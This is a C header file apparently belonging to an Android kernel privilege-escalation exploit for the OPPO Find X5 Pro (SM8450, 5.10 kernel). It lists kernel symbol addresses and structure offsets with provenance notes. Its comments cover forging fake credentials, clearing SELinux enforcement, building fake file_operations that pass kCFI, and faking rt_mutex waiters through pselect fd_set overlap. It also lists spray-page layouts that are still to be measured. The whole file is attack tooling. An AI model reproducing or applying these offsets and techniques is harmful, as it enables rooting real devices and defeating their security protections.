/* ============================================================================
 * PFEM10 target.h — OPPO Find X5 Pro 精确偏移表（116 项，逐项来源标注）
 * ============================================================================
 * 设备   : OPPO Find X5 Pro (PFEM10 / OP5209L1), SM8450, ColorOS 16.0.3.500(CN01)
 * 内核   : 5.10.236-android12-9-o-gaf2075ad2c06 (Clang 12.0.5, r416183b)
 * 源码   : oppo-source/android_kernel_common_oppo_sm8450
 *          branch oppo/sm8450_b_16.0_find_x5_pro (commit ddd3792f0)
 * 日期   : 2026-08-24
 *
 * 来源标注 (每项末尾注释):
 *   [C] = 源码编译导出: 设备 IKCONFIG 真实 .config + 精确源码交叉编译 offsetof
 *         (repos/ks-sm8450-pfem10/offsets_dump.c, 116 项; 与内核 asm-offsets 同构)
 *   [P] = panic 取证   : 真机 panic 反汇编/寄存器 (pi_blocked_on=0x898 双实锤)
 *   [D] = vmlinux 反汇编: ghostlock-tools/work/vmlinux.elf (llvm-nm/objdump)
 *   [S] = slabinfo     : 真机 /proc/slabinfo (mm_struct 对象几何)
 *   [X] = 外部参考     : Find N2/Quest3 移植值, 仅作对比, 不可直接使用
 *
 * 与 JoinChang 偏移表/Find N2 target.h 的差异 (全部以 [C] 编译值为准):
 *   - cred.uid         = 0x04 (参考表 0x08 系未实测默认值)
 *   - cred.securebits  = 0x24, caps 0x28..0x48, security 0x78
 *   - pipe tmp_page    = 0x88, bufs 0xA0, user 0xA8, sizeof 0xB0
 *     (OPPO 5.10 有 r_counter/w_counter@0x80/0x84 且无 WATCH_QUEUE,
 *      Find N2 的 0x90/0xA8/0xB0 不适用)
 *   - uclamp_req       = 0x408/0x40C, uclamp = 0x410/0x414 (Find N2 0x350/0x358 不适用)
 *   - sched_task_group = 0x310 (Find N2 0x348 不适用)
 *   - pi_lock/pi_waiters/pi_top_task = 0x86C/0x880/0x890 (Find N2 0x924/0x938/0x948 不适用)
 *   - preempt_count    = 0x18 (v8 写 init_task+0x08 实为 addr_limit, 非 preempt_count)
 * ============================================================================
 */
#ifndef PFEM10_TARGET_H
#define PFEM10_TARGET_H

/* ------------------------- 运行时常量 (39-bit VA) ------------------------- */
#define PFEM10_KIMAGE_TEXT_BASE   0xffffffc008000000ULL  /* [D] vmlinux-to-elf _text */
#define PFEM10_PAGE_OFFSET        0xffffff8000000000ULL  /* [D] 39-bit VA direct map */
#define PFEM10_PHYS_OFFSET        0x80000000ULL          /* [D] vmlinux PHYS_OFFSET */
#define PFEM10_KERNEL_PHYS_LOAD   0xa8000000ULL          /* [X] OPLUS 家族值, 待 /proc/iomem 确认 */
#define PFEM10_KERNELSNITCH_ID_START 0xffffff8000000000ULL
#define PFEM10_KERNELSNITCH_ID_END   0xffffffc000000000ULL  /* 39-bit: 16GB direct map */

/* ------------------------- 全局符号偏移 (vmlinux.elf) --------------------- */
/* [D] 全部 llvm-nm 实测; ashmem_misc_fops = ashmem_misc(0x291A8D8)+0x10 [C] miscdevice.fops */
#define PFEM10_OFF_INIT_TASK           0x027CC000ULL  /* [D] */
#define PFEM10_OFF_INIT_CRED           0x027E0BE0ULL  /* [D] */
#define PFEM10_OFF_ROOT_USER           0x027DF760ULL  /* [D] root_user (caps-only 假 cred user) */
#define PFEM10_OFF_INIT_GROUPS         0x027E0C88ULL  /* [D] init_groups (caps-only 假 cred group_info) */
#define PFEM10_OFF_INIT_USER_NS        0x027DF7F8ULL  /* [D] init_user_ns (caps-only 假 cred user_ns, 缺失必 panic) */
#define PFEM10_OFF_INIT_UTS_NS         0x027CBDA8ULL  /* [D] */
#define PFEM10_OFF_EMPTY_ZERO_PAGE     0x029C3000ULL  /* [D] */
#define PFEM10_OFF_ROOT_TASK_GROUP     0x029C8040ULL  /* [D] */
#define PFEM10_OFF_SELINUX_STATE       0x02A793C8ULL  /* [D] 结构首址, 8B 清零含 enforced */
#define PFEM10_OFF_KPTR_RESTRICT       0x027BCF68ULL  /* [D] */
#define PFEM10_OFF_SELINUX_BLOB_SIZES  0x02302CC0ULL  /* [D] */
#define PFEM10_OFF_SECURITY_HOOK_HEADS 0x02302628ULL  /* [D] */
#define PFEM10_OFF_KMALLOC_CACHES      0x02302160ULL  /* [D] */
#define PFEM10_OFF_ANON_PIPE_BUF_OPS   0x0216AB68ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_MISC_FOPS    0x0291A8E8ULL  /* [D] ashmem_misc+0x10 */
#define PFEM10_OFF_ASHMEM_FOPS         0x022C0148ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_IOCTL        0x011EE7D8ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_COMPAT_IOCTL 0x011EF2E8ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_MMAP         0x011EF348ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_OPEN         0x011EF588ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_RELEASE      0x011EF628ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_SHOW_FDINFO  0x011EF74CULL  /* [D] */
/* .cfi_jt 蹦床地址（vmlinux.elf nm 实证; fake fops 表存裸地址即可过 kCFI,
   泄露回读校验/表构造时需与 cfi_jt 比对） */
#define PFEM10_OFF_ASHMEM_IOCTL_CFI_JT       0x01837928ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_COMPAT_IOCTL_CFI_JT 0x01837930ULL /* [D] */
#define PFEM10_OFF_ASHMEM_MMAP_CFI_JT        0x01822A68ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_OPEN_CFI_JT        0x01831488ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_RELEASE_CFI_JT     0x01831490ULL  /* [D] */
#define PFEM10_OFF_ASHMEM_SHOW_FDINFO_CFI_JT 0x01822BE8ULL  /* [D] */

/* configfs bin 文件处理器（5.10 无 *_iter, 走 fops.read/.write, [D]） */
#define PFEM10_OFF_CONFIGFS_READ_BIN_FILE      0x006B0D14ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_WRITE_BIN_FILE     0x006B0F8CULL /* [D] */
#define PFEM10_OFF_CONFIGFS_OPEN_BIN_FILE      0x006B1158ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_RELEASE_BIN_FILE   0x006B1180ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_READ_BIN_FILE_CFI_JT   0x0182FCF8ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_WRITE_BIN_FILE_CFI_JT  0x01830218ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_OPEN_BIN_FILE_CFI_JT   0x01830CE0ULL /* [D] */
#define PFEM10_OFF_CONFIGFS_RELEASE_BIN_FILE_CFI_JT 0x01830CE8ULL /* [D] */
#define PFEM10_OFF_NOOP_LLSEEK         0x0056CF70ULL  /* [D] */
#define PFEM10_OFF_SLIDE_NFULNL_LOGGER 0x027C14B8ULL  /* [D] */
#define PFEM10_OFF_SLIDE_LOGGERS_0_1   0x027C13F0ULL  /* [D] */
#define PFEM10_OFF_SLIDE_BOOT_ID       0x02B99B6DULL  /* [D] sysctl_bootid */
#define PFEM10_OFF_SYSTEM_UNBOUND_WQ   0x027B9E88ULL  /* [D] UMH 前置 */
#define PFEM10_OFF_CALL_UMH_EXEC_WORK  0x001672ACULL  /* [D] */

/* ------------------------- task_struct / thread_info ---------------------- */
/* [C] 全部编译导出; [P] panic 取证项单独标注; GKI KMI 冻结布局 (android12-5.10) */
#define PFEM10_TI_FLAGS          0x00  /* [C] thread_info.flags */
#define PFEM10_TI_ADDR_LIMIT     0x08  /* [C] thread_info.addr_limit (mm_segment_t) */
#define PFEM10_TI_TTBR0          0x10  /* [C] CONFIG_ARM64_SW_TTBR0_PAN=y */
#define PFEM10_TI_PREEMPT_COUNT  0x18  /* [C] 注意: v8 写 +0x08 实为 addr_limit */
#define PFEM10_TI_SCS_BASE       0x20  /* [C] CONFIG_SHADOW_CALL_STACK=y */
#define PFEM10_TI_SCS_SP         0x28  /* [C] */
#define PFEM10_TI_SIZE           0x30  /* [C] */

#define PFEM10_TASK_STACK            0x38   /* [C] */
#define PFEM10_TASK_USAGE            0x40   /* [C] */
#define PFEM10_TASK_FLAGS            0x44   /* [C] */
#define PFEM10_TASK_PRIO             0x84   /* [C] */
#define PFEM10_TASK_STATIC_PRIO      0x88   /* [C] */
#define PFEM10_TASK_NORMAL_PRIO      0x8C   /* [C] */
#define PFEM10_TASK_RT_PRIORITY      0x90   /* [C] */
#define PFEM10_TASK_SCHED_TASK_GROUP 0x310  /* [C] Find N2 0x348 ✗ */
#define PFEM10_TASK_UCLAMP_REQ_MIN   0x408  /* [C] struct uclamp_se (u32 位域) */
#define PFEM10_TASK_UCLAMP_REQ_MAX   0x40C  /* [C] */
#define PFEM10_TASK_UCLAMP_MIN       0x410  /* [C] */
#define PFEM10_TASK_UCLAMP_MAX       0x414  /* [C] */
/* uclamp_se 位域 (u32): value:10 | bucket_id:5 | active:1 | user_defined:1 */
#define PFEM10_TASK_MM               0x518  /* [C] */
#define PFEM10_TASK_ACTIVE_MM        0x520  /* [C] */
#define PFEM10_TASK_TASKS            0x4C8  /* [C] */
#define PFEM10_TASK_REAL_PARENT      0x5D8  /* [C] */
#define PFEM10_TASK_PID              0x5C8  /* [C] */
#define PFEM10_TASK_TGID             0x5CC  /* [C] */
#define PFEM10_TASK_ATOMIC_FLAGS     0x590  /* [C] */
#define PFEM10_TASK_SECCOMP          0x848  /* [C] */
#define PFEM10_TASK_REAL_CRED        0x778  /* [C] */
#define PFEM10_TASK_CRED             0x780  /* [C] */
#define PFEM10_TASK_COMM             0x790  /* [C] */
#define PFEM10_TASK_PI_LOCK          0x86C  /* [C] */
#define PFEM10_TASK_PI_WAITERS       0x880  /* [C] rb_root_cached; rb_leftmost@0x888 */
#define PFEM10_TASK_PI_TOP_TASK      0x890  /* [C] */
#define PFEM10_TASK_PI_BLOCKED_ON    0x898  /* [C]+[P] panic `ldr x8,[x23,#0x898]` */
#define PFEM10_TASK_SIZE             0x1280 /* [C] sizeof = 4736 */

/* ------------------------- mm_struct (KernelSnitch) ----------------------- */
/* [C] 编译导出; mm->owner 在本 OPLUS 树挂 CONFIG_MEMCG 下 */
#define PFEM10_MM_MMAP       0x00  /* [C] */
#define PFEM10_MM_MM_RB      0x08  /* [C] */
#define PFEM10_MM_PGD        0x48  /* [C] */
#define PFEM10_MM_MM_USERS   0x54  /* [C] */
#define PFEM10_MM_OWNER      0x348 /* [C]+[D] mm_update_next_owner ldr [x0,#0x348] */
#define PFEM10_MM_USER_NS    0x350 /* [C] */
#define PFEM10_MM_EXE_FILE   0x358 /* [C] */
#define PFEM10_MM_STRUCT_SZ  0x3B8 /* [C] sizeof */
#define PFEM10_MM_SLAB_SZ    0x3C0 /* [S] slabinfo objsize 960 (对齐后); KernelSnitch 步长 */
#define PFEM10_MM_SLAB_ORDER 3     /* [S] slabinfo 34obj/块 8页/块 → order 3 */

/* ------------------------- rt_mutex_waiter (5.10 compact) ----------------- */
/* [C] 编译导出 (kernel/locking/rtmutex_common.h); 与 Find N2/Quest3 一致 */
#define PFEM10_WAITER_TREE_ENTRY    0x00  /* [C] */
#define PFEM10_WAITER_PI_TREE_ENTRY 0x18  /* [C] */
#define PFEM10_WAITER_TASK          0x30  /* [C] v8 fd_set 假 waiter 构造点 */
#define PFEM10_WAITER_LOCK          0x38  /* [C] v8 实测 lock=0x38 */
#define PFEM10_WAITER_PRIO          0x40  /* [C] int prio */
#define PFEM10_WAITER_DEADLINE      0x48  /* [C] u64 deadline */
#define PFEM10_WAITER_SIZE          0x50  /* [C] */
/* 5.10 无 wake_state / ww_ctx (6.x 才有) */
#define PFEM10_RB_PARENT_COLOR 0x00  /* [C] */
#define PFEM10_RB_RIGHT        0x08  /* [C] */
#define PFEM10_RB_LEFT         0x10  /* [C] */
#define PFEM10_RB_SIZE         0x18  /* [C] */

/* ------------------------- pipe (修正后段) -------------------------------- */
/* [C] 编译导出. OPPO 5.10: 有 r_counter/w_counter, 无 WATCH_QUEUE
 *     → tmp_page 起比 Find N2 少 8 字节 (0x88/0xA0/0xA8/0xB0, 勿用 0x90/0xA8/0xB0) */
#define PFEM10_PIPE_HEAD        0x60  /* [C] */
#define PFEM10_PIPE_TAIL        0x64  /* [C] */
#define PFEM10_PIPE_MAX_USAGE   0x68  /* [C] */
#define PFEM10_PIPE_RING_SIZE   0x6C  /* [C] */
#define PFEM10_PIPE_NR_ACCOUNTED 0x70 /* [C] */
#define PFEM10_PIPE_READERS     0x74  /* [C] */
#define PFEM10_PIPE_WRITERS     0x78  /* [C] */
#define PFEM10_PIPE_FILES       0x7C  /* [C] */
#define PFEM10_PIPE_R_COUNTER   0x80  /* [C] OPLUS 5.10 特有 */
#define PFEM10_PIPE_W_COUNTER   0x84  /* [C] OPLUS 5.10 特有 */
#define PFEM10_PIPE_TMP_PAGE    0x88  /* [C] ✗ Find N2 0x90 */
#define PFEM10_PIPE_FASYNC_RD   0x90  /* [C] */
#define PFEM10_PIPE_FASYNC_WR   0x98  /* [C] */
#define PFEM10_PIPE_BUFS        0xA0  /* [C] ✗ Find N2 0xA8 */
#define PFEM10_PIPE_USER        0xA8  /* [C] ✗ Find N2 0xB0 */
#define PFEM10_PIPE_SIZE        0xB0  /* [C] ✗ Find N2 0xB8/0xC0 */
#define PFEM10_PBUF_PAGE        0x00  /* [C] pipe_buffer */
#define PFEM10_PBUF_OFFSET      0x08  /* [C] */
#define PFEM10_PBUF_LEN         0x0C  /* [C] */
#define PFEM10_PBUF_OPS         0x10  /* [C] */
#define PFEM10_PBUF_FLAGS       0x18  /* [C] */
#define PFEM10_PBUF_PRIVATE     0x20  /* [C] */
#define PFEM10_PBUF_SIZE        0x28  /* [C] */

/* ------------------------- configfs_buffer (2026-08-25 重反汇编实证) ------ */
/* [D] OPPO 5.10 vmlinux.elf configfs_read/write_bin_file 反汇编定案:
 *   x26/x24=file->private_data=configfs_buffer;
 *   mutex_lock @ buffer+0x20; read_in_progress @ +0x54; write_in_progress @ +0x55;
 *   needs_read_fill @ +0x50; fill 回调 @ attr+0x38; cb_max_size @ +0x64;
 *   vmalloc 结果 / bin_buffer @ +0x58; bin_buffer_size(s32) @ +0x60。
 * 注意 read 路径在跳过 fill 后仍检查 cb_max_size；cb_max_size=0 时直接 -EFBIG。
 * ashmem SET_NAME 的 strscpy 目标为 ashmem_area.name @ +0x0b，且 NUL 终止；
 * 首次 SET_NAME 终止符位置是 name_off+L；最大安全 blob 长度为 0x58，
 * 使终止符落在 +0x63 补齐 bin_buffer_size 高字节，而不进入 +0x64。 */
#define PFEM10_CFG_NAME_OFF          0x0b  /* [D] */
#define PFEM10_CFG_MUTEX_OFF         0x20  /* [D] */
#define PFEM10_CFG_NEEDS_READ_FILL_OFF 0x50 /* [D] */
#define PFEM10_CFG_READ_IN_PROGRESS_OFF 0x54 /* [D] */
#define PFEM10_CFG_WRITE_IN_PROGRESS_OFF 0x55 /* [D] */
#define PFEM10_CFG_BIN_BUFFER_OFF    0x58  /* [D] */
#define PFEM10_CFG_BIN_BUFFER_SIZE_OFF 0x60 /* [D] */
#define PFEM10_CFG_CB_MAX_SIZE_OFF   0x64  /* [D] */
#define PFEM10_CFG_BLOB_LEN          0x58  /* [D] NUL-safe; first NUL lands at +0x63 */

/* ------------------------- file / file_operations (5.10 布局) -------------- */
#define PFEM10_FILE_F_OP     0x28  /* [C] */
#define PFEM10_FILE_F_COUNT  0x38  /* [C] */
#define PFEM10_FILE_F_MODE   0x44  /* [C] */
#define PFEM10_FILE_SIZE     0x128 /* [C] */
#define PFEM10_FOPS_OWNER         0x00  /* [C] */
#define PFEM10_FOPS_LLSEEK        0x08  /* [C] */
#define PFEM10_FOPS_READ          0x10  /* [C] */
#define PFEM10_FOPS_WRITE         0x18  /* [C] */
#define PFEM10_FOPS_READ_ITER     0x20  /* [C] */
#define PFEM10_FOPS_WRITE_ITER    0x28  /* [C] */
#define PFEM10_FOPS_IOCTL         0x50  /* [C] */
#define PFEM10_FOPS_COMPAT_IOCTL  0x58  /* [C] */
#define PFEM10_FOPS_MMAP          0x60  /* [C] */
#define PFEM10_FOPS_OPEN          0x70  /* [C] */
#define PFEM10_FOPS_RELEASE       0x80  /* [C] */
#define PFEM10_FOPS_SPLICE_READ   0xC0  /* [C] */
#define PFEM10_FOPS_SHOW_FDINFO   0xE0  /* [C] */
#define PFEM10_FOPS_SIZE          0x120 /* [C] */

/* ------------------------- cred (修正) / seccomp -------------------------- */
/* [C] 编译导出. struct cred 以 atomic_t usage 开头 → uid=0x04
 *     (JoinChang 表 uid 0x08/securebits 0x28/caps 0x30/security 0x80 系未实测默认) */
#define PFEM10_CRED_USAGE         0x00  /* [C] */
#define PFEM10_CRED_UID           0x04  /* [C] ✗ 参考表 0x08 */
#define PFEM10_CRED_GID           0x08  /* [C] */
#define PFEM10_CRED_SUID          0x0C  /* [C] */
#define PFEM10_CRED_SGID          0x10  /* [C] */
#define PFEM10_CRED_EUID          0x14  /* [C] */
#define PFEM10_CRED_EGID          0x18  /* [C] */
#define PFEM10_CRED_FSUID         0x1C  /* [C] */
#define PFEM10_CRED_FSGID         0x20  /* [C] */
#define PFEM10_CRED_SECUREBITS    0x24  /* [C] ✗ 参考表 0x28 */
#define PFEM10_CRED_CAP_INHERITABLE 0x28 /* [C] ✗ 参考表 0x30 */
#define PFEM10_CRED_CAP_PERMITTED 0x30  /* [C] */
#define PFEM10_CRED_CAP_EFFECTIVE 0x38  /* [C] */
#define PFEM10_CRED_CAP_BSET      0x40  /* [C] */
#define PFEM10_CRED_CAP_AMBIENT   0x48  /* [C] */
/* 2026-08-26 修正: [C] 表原 user=0x50/group_info=0x58 系无 KEYS 参考布局猜测,
 * 与真机不符。init_cred 字节实证 (vmlinux .data dump, CONFIG_KEYS=y 源码顺序):
 *   cap_ambient@0x48 jit_keyring@0x50 session_keyring@0x58 process_keyring@0x60
 *   thread_keyring@0x68 request_key_auth@0x70 security@0x78 user@0x80
 *   user_ns@0x88 group_info@0x90 rcu@0x98 sizeof 0xA8 */
#define PFEM10_CRED_USER          0x80  /* [D] init_cred 字节实证 — 旧 0x50 错 (实为 jit_keyring) */
#define PFEM10_CRED_USER_NS       0x88  /* [D] init_cred 字节实证 — 旧缺, NULL → getuid()/cap 检查必 panic */
#define PFEM10_CRED_GROUP_INFO    0x90  /* [D] init_cred 字节实证 — 旧 0x58 错 (实为 session_keyring) */
#define PFEM10_CRED_SECURITY      0x78  /* [C] ✗ 参考表 0x80 (字节实证一致) */
#define PFEM10_CRED_SIZE          0xA8  /* [C] */
#define PFEM10_SECCOMP_MODE        0x00  /* [C] */
#define PFEM10_SECCOMP_FILTER_COUNT 0x04 /* [C] */
#define PFEM10_SECCOMP_FILTER      0x08  /* [C] */
#define PFEM10_SECCOMP_SIZE        0x10  /* [C] */

/* ------------------------- miscdevice (ashmem) ---------------------------- */
#define PFEM10_MISC_MINOR 0x00  /* [C] */
#define PFEM10_MISC_NAME  0x08  /* [C] */
#define PFEM10_MISC_FOPS  0x10  /* [C]+[D] ashmem_misc(0x291A8D8)+0x10 实测一致 */
#define PFEM10_MISC_SIZE  0x50  /* [C] */

/* ------------------------- 锁类型尺寸 (布局前提) -------------------------- */
/* [C] DEBUG_SPINLOCK/LOCKDEP 全关 → qspinlock 4B */
#define PFEM10_SZ_SPINLOCK     4   /* [C] */
#define PFEM10_SZ_RAW_SPINLOCK 4   /* [C] */
#define PFEM10_SZ_RWLOCK       8   /* [C] */
#define PFEM10_SZ_ATOMIC_T     4   /* [C] */
#define PFEM10_SZ_ATOMIC64     8   /* [C] */

/* ------------------------- 待实测 (不可移植, 勿用 Find N2 值) ------------- */
/* 以下为喷页/栈回收布局, 逐 build 不同, 需真机实测后填入:
 *   - PSELECT_WAITER_WORD_SHIFT (popsicle: fd_set 覆盖 waiter 的 word 布局)
 *   - LOCK_OFF / W0_OFF / FOPS_OFF / FAKE_TASK_OFF (喷页内偏移)
 *   - SKB_DATA_DELTA (5.10: Find N2 -0xe80, Quest3 -0xe20, PFEM10 未测)
 *   - MM_STRUCT_SZ 用 0x3C0 (slab), 勿用 sizeof 0x3B8
 */

#endif /* PFEM10_TARGET_H */
